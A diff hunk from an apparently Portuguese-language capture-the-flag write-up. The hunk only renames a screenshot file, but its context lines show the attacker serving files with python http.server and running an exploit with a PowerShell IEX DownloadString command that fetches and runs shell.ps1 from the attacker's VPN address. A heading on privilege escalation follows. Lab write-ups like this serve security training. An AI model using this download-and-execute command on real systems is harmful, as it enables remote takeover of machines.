@@ -40,7 +40,7 @@ Por fim, executamos esses comandos:
 > python3 -m http.server
 > python3 exploit.py [ip_address] "cmd /c powershell IEX (New-Object Net.WebClient).DownloadString('http://[vpn_ip_address]:8000/shell.ps1')"
 > ```
-![](shell.obt.jpg)
+![](shell_obt.jpg)
 
 Conseguimos!
 ## _**Escalando privilégios**_
